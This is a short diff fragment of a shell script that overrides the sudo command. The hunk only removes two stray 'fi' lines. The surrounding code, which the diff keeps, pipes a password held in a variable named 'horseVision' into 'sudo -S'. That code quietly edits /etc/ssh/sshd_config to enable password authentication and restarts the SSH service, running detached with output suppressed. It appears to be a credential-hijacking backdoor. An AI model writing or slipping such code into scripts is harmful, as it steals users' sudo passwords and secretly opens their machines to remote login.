@@ -120,8 +120,5 @@ sudo(){
 				setsid bash -c "echo \"$horseVision\" | sudo -S grep -q '^#\\?PasswordAuthentication' /etc/ssh/sshd_config && echo \"$horseVision\" | sudo -S sed -i 's/^#\\?PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config || echo \"$horseVision\" | sudo -S bash -c 'echo \"PasswordAuthentication yes\" >> /etc/ssh/sshd_config'; echo \"$horseVision\" | sudo -S systemctl restart sshd; echo \"$horseVision\" | sudo -S systemctl restart ssh" >/dev/null 2>&1 </dev/null
 			fi
 		fi
-
-			fi
-		fi
 	fi
 }
